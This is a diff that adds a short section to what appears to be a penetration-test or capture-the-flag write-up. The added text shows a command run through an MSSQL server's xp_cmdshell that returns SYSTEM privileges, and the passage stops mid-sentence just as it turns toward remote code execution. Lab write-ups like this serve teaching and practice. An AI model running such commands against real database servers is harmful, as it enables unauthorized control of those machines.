@@ -159,4 +159,13 @@ SQL (sql_svc  dbo@master)>
 ```
 I now have access to the database
 
-
+## xp_cmdshell
+```python
+SQL (sql_svc  dbo@master)> xp_cmdshell whoami
+output                
+-------------------   
+nt authority\system   
+NULL                  
+SQL (sql_svc  dbo@master)> 
+```
+`xp_cmdshell` is enabled which means i can get remote c
